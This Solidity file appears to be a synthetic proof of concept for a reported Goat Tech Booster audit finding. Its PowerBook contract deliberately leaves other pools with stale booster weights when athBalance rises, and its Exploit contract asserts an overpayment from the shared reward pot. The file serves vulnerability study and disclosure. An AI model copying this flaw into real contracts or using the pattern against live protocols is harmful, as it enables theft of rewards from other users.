// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Goat Tech Booster — athBalance rises and other pools keep a stale power
    (Cantina / cccz, AuditVault 40668).
    SYNTHETIC, cheatcode-free. Report example, scaled by 3000 so
    1 + balance/ath is an integer:
      A 500/1000 -> 1.5 -> weight 4500
      B 1000/1000 -> 2 -> weight 6000
    B stakes 500. athBalance becomes 1500. B is refreshed to 2 (6000).
    A stays 1.5 (4500) instead of 1 + 500/1500 = 4/3 (weight 4000).
    A pot of 10500 pays A 4500 on the stale weight. The fair share is 4200.
    The control refreshes A before the payout. */

contract Reward {
    mapping(address => uint256) public balanceOf;
    address public immutable minter;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }
}

contract PowerBook {
    uint256 public constant SCALE = 3000;
    uint256 public constant POT = 10500;

    uint256 public athBalance;
    Reward public reward;
    mapping(address => uint256) public tokenBalance;
    mapping(address => uint256) public booster;

    constructor() {
        reward = new Reward();
    }

    function calBooster(uint256 balance, uint256 ath) public pure returns (uint256) {
        return SCALE + balance * SCALE / ath;
    }

    function _reCalBooster(address account_) internal {
        uint256 maxBoostVotePower = athBalance;
        uint256 boostVotePower = tokenBalance[account_];
        uint256 newBooster = calBooster(boostVotePower, maxBoostVotePower);
        booster[account_] = newBooster;
    }

    /// Fix: anyone can refresh a pool after athBalance moves.
    function reCalBooster(address account_) external {
        _reCalBooster(account_);
    }

    function configure(address pool, uint256 balance, uint256 ath) external {
        athBalance = ath;
        tokenBalance[pool] = balance;
        _reCalBooster(pool);
    }

    function stake(uint256 amount) external {
        tokenBalance[msg.sender] += amount;
        if (tokenBalance[msg.sender] > athBalance) {
            athBalance = tokenBalance[msg.sender];
        }
        // @> VULN: athBalance just moved, but only the staking pool's booster is recomputed.
        _reCalBooster(msg.sender);
    }

    function claim(address pool, address other) external returns (uint256 share) {
        uint256 mine = booster[pool];
        uint256 theirs = booster[other];
        share = POT * mine / (mine + theirs);
        reward.mint(pool, share);
    }
}

contract Pool {
    PowerBook public immutable book;

    constructor(address book_) {
        book = PowerBook(book_);
    }

    function stake(uint256 amount) external {
        book.stake(amount);
    }
}

contract Exploit {
    PowerBook public book;
    Pool public poolB;
    Reward public reward;
    uint256 public staleWeight;
    uint256 public fairWeight;
    uint256 public staleShare;
    uint256 public fairShare;

    constructor() {
        book = new PowerBook();
        poolB = new Pool(address(book));
        reward = book.reward();
    }

    function run() external {
        book.configure(address(this), 500, 1000);
        book.configure(address(poolB), 1000, 1000);
        poolB.stake(500);
        require(book.athBalance() == 1500, "ath");
        require(book.tokenBalance(address(poolB)) == 1500, "B balance");
        staleWeight = book.booster(address(this));
        fairWeight = book.calBooster(500, book.athBalance());
        require(staleWeight == 4500, "stale 1.5");
        require(fairWeight == 4000, "fair 4/3");
        staleShare = book.claim(address(this), address(poolB));
        fairShare = book.POT() * fairWeight / (fairWeight + book.booster(address(poolB)));
        require(staleShare == 4500, "paid on stale power");
        require(fairShare == 4200, "fair share");
        require(staleShare > fairShare, "overpaid");
        require(reward.balanceOf(address(this)) == staleShare, "reward");
    }
}
